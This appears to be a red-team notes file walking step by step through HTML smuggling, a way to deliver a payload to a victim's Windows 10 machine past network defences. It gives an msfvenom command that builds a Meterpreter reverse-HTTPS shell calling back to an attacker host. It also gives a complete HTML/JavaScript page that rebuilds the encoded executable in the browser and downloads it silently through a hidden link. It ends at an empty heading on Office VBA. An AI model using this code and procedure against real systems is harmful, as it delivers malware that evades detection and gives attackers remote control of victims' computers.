## HTML Smuggling 
Attempting to use this TTP to deliver a payload to the Vicitm Win10 [Microsoft Link](https://www.microsoft.com/security/blog/2021/11/11/html-smuggling-surges-highly-evasive-loader-technique-increasingly-used-in-banking-malware-targeted-attacks/)

This attack is effective because it encodes an apbitary file into a javascript blob which it then rebuilds on the target. Thus, the payload does not pass through network sensors, IDS, proxies, and other network based defensive tools.  It builds the malware locally in the browser and then downloads it to the target. 

We will still need to account for EDR tools, however, it is an evasive loader TTP that can subvert network detection metods. 

**Step 1 )**
- Generate a payload and convert it to base64 to be stored in the blob later.
	- `sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.10.10 LPORT=443 -f exe -o /var/www/html/msfstaged.exe`
	- `base64 /var/www/html/msfstaged.exe`
		- Note: You must store the b64 in one continuous string... Remove the all line breaks `\n`

**Step 2 ) **
- Convert the b64 payload to a byte array and store in a data var
	- function base64ToArrayBuffer(base64)
```
function base64ToArrayBuffer(base64)
{
 var binary_string = window.atob(base64);
 var len = binary_string.length;
 var bytes = new Uint8Array( len );
 for (var i = 0; i < len; i++) { bytes[i] = binary_string.charCodeAt(i); }
 return bytes.buffer;
}
```

**Step 3 )**
- Take that new byte array and store the array for use
	- `var data = base64ToArrayBuffer(file);`

**Step 4 )**
- Generate the Blob of data with a MIME type for generic binary data (or binary data whose true type is unknown) is `application/octet-stream`.
	-  `var blob = new Blob([data], {type: 'octet/stream'}); `
-  The constructor syntax is:

`new Blob(blobParts, options);`

-   **`blobParts`** is an array of `Blob`/`BufferSource`/`String` values.
-   **`options`** optional object:
	-   **`type`** – `Blob` type, usually MIME-type, e.g. `image/png`,
	-   **`endings`** – whether to transform end-of-line to make the `Blob` correspond to current OS newlines (`\r\n` or `\n`). By default `"transparent"` (do nothing), but also can be `"native"` (transform).

	For example:
	```
	// create Blob from a string
	let blob = new Blob(["<html>…</html>"], {type: 'text/html'});
	// please note: the first argument must be an array [...]
	```


**Step 5 )**
- Create the hidden anchor `<a>` html anchor tag and move our data into this html anchor
	- 

**Step 6 )**
- Name the file, pass that to the anchor tag, and preform a click action to download the file without user action. The HTML DOM `createElement()` Method creates an Element Node with the specified name. After the element is created, use the `element.appendChild()` or `element.insertBefore()` method to insert it to the document.
	- `var a = document.createElement('a');` 
	- `document.body.appendChild(a);` 
	-  `a.style = 'display: none';`
	Example: 
```
<!DOCTYPE html>
<html>
<body>

<p>Click the button to create a P element with some text.</p>

<button onclick="myFunction()">Try it</button>

<script>
function myFunction() {
  var para = document.createElement("p");
  para.innerText = "This is a paragraph.";
  document.body.appendChild(para);
}
</script>

</body>
</html>
```
As you can see the function `myFunction()` is called by the "Try is" `<button>`. When the script is called the `<p>` element is created and  the `innerText` property of the element is used to display some text. 

**Step 7 )**
- Finish building the anchor tag with the requsit elements. 
	- 	`var url = window.URL.createObjectURL(blob); `
	- 	`a.href = url; `
	- 	`a.download = fileName; a.click(); `
	- 	`window.URL.revokeObjectURL(url);`

Entire Sctipt )
```
<html>
 <body>
 <script>
	 function base64ToArrayBuffer(base64) {
	 var binary_string = window.atob(base64);
	 var len = binary_string.length;
	 var bytes = new Uint8Array( len );
	 for (var i = 0; i < len; i++) { bytes[i] = binary_string.charCodeAt(i);
	}
	 return bytes.buffer;
	 } 

	 var file ='TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAA... 
	 var data = base64ToArrayBuffer(file); 
	 var blob = new Blob([data], {type: 'octet/stream'}); 
	 var fileName = 'msfstaged.exe'; 

	 var a = document.createElement('a'); 
	 document.body.appendChild(a); 
	 a.style = 'display: none'; 
	 var url = window.URL.createObjectURL(blob); 
	 a.href = url; 
	 a.download = fileName; a.click(); 
	 window.URL.revokeObjectURL(url);
 </script>
 </body>
</html>
```

## Microsoft Office VBA
